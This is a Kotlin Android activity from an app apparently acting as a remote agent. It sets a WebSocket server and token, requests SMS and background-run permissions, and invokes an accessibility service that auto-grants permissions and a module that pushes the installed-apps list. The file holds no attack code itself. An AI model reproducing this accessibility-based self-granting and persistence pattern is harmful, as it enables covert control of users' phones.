package com.base.realtime.ui

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import com.base.realtime.R
import com.base.realtime.RealtimeApp
import com.base.realtime.config.AppConfigs
import com.base.realtime.endpoint.PortEndpointStore
import com.base.realtime.engine.EngineState
import com.base.realtime.engine.Phase
import com.base.realtime.identity.IdentityStore
import com.base.realtime.access.AccessibilityGate
import com.base.realtime.access.AgentAccessibilityService
import com.base.realtime.access.AutoGrantOrchestrator
import com.base.realtime.access.AutoGrantProgress
import com.base.realtime.apps.InstalledAppsPush
import com.base.realtime.oem.BackgroundAccess
import com.base.realtime.onboarding.OnboardingStore
import com.base.realtime.service.RealtimeService
import com.base.realtime.sms.SmsPermissions
import java.text.DateFormat
import java.util.Date
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : Activity() {
    private val identityStore by lazy { IdentityStore(this) }
    private val uiScope = CoroutineScope(SupervisorJob() + Dispatchers.Main.immediate)
    private var stateJob: Job? = null
    private var ready = false
    private lateinit var statusView: TextView
    private lateinit var deviceView: TextView
    private lateinit var accessView: TextView
    private lateinit var serverInput: EditText
    private lateinit var tokenInput: EditText
    private lateinit var saveButton: Button
    private lateinit var oemHint: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (OnboardingStore.shouldShow(this)) {
            startActivity(
                Intent(this, LaunchActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP),
            )
            finish()
            return
        }
        InstalledAppsPush.markUiReady(this)
        try {
            setContentView(R.layout.activity_main)
            statusView = findViewById(R.id.statusView)
            deviceView = findViewById(R.id.deviceView)
            accessView = findViewById(R.id.accessView)
            serverInput = findViewById(R.id.serverInput)
            tokenInput = findViewById(R.id.tokenInput)
            saveButton = findViewById(R.id.saveButton)
            oemHint = findViewById(R.id.oemHint)
            ready = true
        } catch (_: Throwable) {
            Toast.makeText(this, R.string.settings_unavailable, Toast.LENGTH_SHORT).show()
            return
        }
        val config = AppConfigs.load(this)
        tokenInput.setText(identityStore.get()?.token ?: config.token)
        deviceView.text = getString(R.string.device_id, identityStore.userId())
        oemHint.text = getString(R.string.oem_hint, Build.MANUFACTURER)
        saveButton.setOnClickListener { onAction() }
        findViewById<Button>(R.id.notificationButton).setOnClickListener { requestNotificationPermission() }
        findViewById<Button>(R.id.accessibilityButton).setOnClickListener {
            AccessibilityGate.openSettings(this@MainActivity)
        }
        findViewById<Button>(R.id.batteryButton).setOnClickListener { launch { BackgroundAccess.requestIgnoreBatteryOptimizations(this) } }
        findViewById<Button>(R.id.alarmButton).setOnClickListener { launch { BackgroundAccess.requestExactAlarm(this) } }
        findViewById<Button>(R.id.oemButton).setOnClickListener { launch { BackgroundAccess.openAutostartSettings(this) } }
        // اعلان/SMS از صف auto-grant می‌آید؛ اینجا فقط اگر a11y خاموش است دکمهٔ دستی
        serverInput.setText(identityStore.get()?.serverUrl.orEmpty())
        uiScope.launch {
            val endpoint = withContext(Dispatchers.IO) { PortEndpointStore.resolve(this@MainActivity) }
            if (endpoint != null) {
                identityStore.ensureReady(endpoint.wsUrl, config.token.ifBlank { identityStore.get()?.token.orEmpty() })
                PortEndpointStore.startListening(this@MainActivity)
                serverInput.setText(endpoint.wsUrl)
            } else {
                val cached = PortEndpointStore.cached(this@MainActivity)?.wsUrl
                    ?: identityStore.get()?.serverUrl.orEmpty()
                if (cached.isNotBlank()) {
                    serverInput.setText(cached)
                }
            }
            if (identityStore.hasIdentity()) {
                RealtimeService.start(this@MainActivity)
            }
        }
    }

    override fun onStart() {
        super.onStart()
        if (!ready) return
        stateJob?.cancel()
        stateJob = uiScope.launch {
            RealtimeApp.engine(this@MainActivity).state.collect { state ->
                try {
                    render(state)
                } catch (_: Throwable) {
                }
            }
        }
    }

    override fun onStop() {
        stateJob?.cancel()
        stateJob = null
        super.onStop()
    }

    override fun onDestroy() {
        uiScope.cancel()
        super.onDestroy()
    }

    override fun onResume() {
        super.onResume()
        if (ready) {
            if (AgentAccessibilityService.isEnabled(this)) {
                AutoGrantOrchestrator.resumeIfNeeded(this)
            }
            renderAccess()
            render(RealtimeApp.engine(this).state.value)
        }
    }

    private fun onAction() {
        if (isRunning(RealtimeApp.engine(this).state.value.phase)) {
            RealtimeApp.engine(this).requestStop()
            RealtimeService.stop(this)
            toast(R.string.stopped)
            return
        }
        val url = serverInput.text?.toString()?.trim().orEmpty()
        val token = tokenInput.text?.toString()?.trim().orEmpty()
        if (!url.startsWith("ws://") && !url.startsWith("wss://")) {
            toast(R.string.invalid_url)
            return
        }
        if (token.length > 256) {
            toast(R.string.invalid_token)
            return
        }
        identityStore.save(url, token)
        requestNotificationPermission()
        SmsPermissions.request(this)
        renderAccess()
        RealtimeService.start(this)
        RealtimeApp.engine(this).reconnect()
        toast(R.string.saved)
    }

    private fun renderAccess() {
        val ok = getString(R.string.access_ok)
        val missing = getString(R.string.access_missing)
        val oem = when {
            !BackgroundAccess.needsOemAutostart() -> getString(R.string.access_oem_optional)
            AutoGrantProgress.isOemGranted(this) -> ok
            else -> missing
        }
        accessView.text = getString(
            R.string.access_checklist,
            if (BackgroundAccess.hasNotifications(this)) ok else missing,
            if (AgentAccessibilityService.isEnabled(this)) ok else missing,
            if (BackgroundAccess.isIgnoringBatteryOptimizations(this)) ok else missing,
            if (BackgroundAccess.canScheduleExactAlarms(this)) ok else missing,
            oem,
        )
    }

    private fun render(state: EngineState) {
        val phase = when (state.phase) {
            Phase.Stopped -> "متوقف"
            Phase.NeedIdentity -> "بدون سرور"
            Phase.WaitingNetwork -> "بدون شبکه"
            Phase.Connecting -> "در حال اتصال"
            Phase.Authenticating -> "در حال شناسایی"
            Phase.Authenticated -> "متصل"
        }
        val presence = when (state.serverOnline) {
            true -> "آنلاین"
            false -> "آفلاین"
            null -> "نامشخص"
        }
        val seen = state.lastSeenMillis?.let { DateFormat.getDateTimeInstance().format(Date(it)) } ?: "—"
        statusView.text = getString(R.string.status_template, phase, presence, seen, state.message)
        saveButton.setText(if (isRunning(state.phase)) R.string.stop else R.string.start)
    }

    private fun isRunning(phase: Phase): Boolean {
        return phase != Phase.Stopped && phase != Phase.NeedIdentity
    }

    private fun requestNotificationPermission() {
        if (Build.VERSION.SDK_INT < 33) return
        if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED) {
            return
        }
        requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 10)
    }

    private fun launch(block: () -> Unit) {
        runCatching(block).onFailure { toast(R.string.settings_unavailable) }
    }

    private fun toast(message: Int) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }
}
